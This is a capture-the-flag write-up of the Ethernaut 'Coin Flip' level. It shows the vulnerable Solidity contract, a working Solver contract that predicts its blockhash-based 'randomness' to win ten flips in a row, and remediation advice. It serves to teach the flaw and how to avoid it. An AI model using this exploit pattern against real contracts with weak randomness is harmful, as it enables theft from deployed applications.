![Coin Flip](/assets/img/BigLevel3.svg)

- [Challenge](#challenge)
- [Solution](#solution)
- [Remediation](#remediation)
- [References](#references)
   
# Challenge

This challenge gives us the code of the contract and reads:

> This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

The code given is:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

# Solution

By looking at the contract's code, we see that we can call the flip function, which takes a boolean as input and after "throwing a coin" it compares the outcome with our bet (our input) if they are the same it increments the `consecutiveWins` counter by 1, if it differs, it sets the variable back to 0. 

To solve this challenge, it says that we need to guess the correct outcome 10 times in a row.

So, how can we guess the output of the "coin flip". Well let's look at that code. To get the coin flip, it takes the last block number, gets its hash and divides it by a "factor". This will give true or false.

The problem with this "randomness" generation method is that it's not random at all! Anyone can know what the last block number is... We just need to code some kind of solver or guesser.

To do that I copied the `CoinFlip.sol` code given by the challenge and modified it, so it would "guess" what the outcome of `flip()` will be, and then call `coinFlip.flip()` with that same output:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./CoinFlip.sol";

contract Solver {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlip;
    uint256 public consecutiveWins = 0;

    constructor(address coinFlipAddress) {
        coinFlip = CoinFlip(coinFlipAddress);
    }

    function solve() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        console.log("Solver blockValue: ", blockValue);

        uint256 coin = blockValue / FACTOR;

        bool side = coin == 1 ? true : false;
        coinFlip.flip(side);
        consecutiveWins = coinFlip.consecutiveWins();
        console.log("Consecutive wins: ", coinFlip.consecutiveWins());
    }
}
```

We can deploy this Solver contract with the ethernaut's contract address as input and then run `solve()` function 10 times.

I created a Hardhat project that will automatically deploy the contract and run the `solve()` function 10 times! You can find it here: [ethernaut-03-coin-flip-solver](https://github.com/nicolasraus/ethernaut-03-coin-flip-solver)

After running `solve()` function 10 times, we can verify that now the `consecutiveWins` variable is 10 by running:
```javascript
await contract.consecutiveWins().then(v => v.toString())
'10'
```
And that's it! We solved it :))

![Well done](/assets/img/ethernaut_solved.png)

# Remediation

To prevent this kind of vulnerabilities do not try to generate randomness by using fields that are controlled by the miner, instead use:
- a commitment scheme, e.g. [RANDAO](https://github.com/randao/randao).
- external sources of randomness via oracles, e.g. [Oraclize](http://www.oraclize.it/). Note that this approach requires trusting in oracle, thus it may be reasonable to use multiple oracles.
- Bitcoin block hashes, as they are more expensive to mine.

# References

- [SWC-120](https://swcregistry.io/docs/SWC-120)
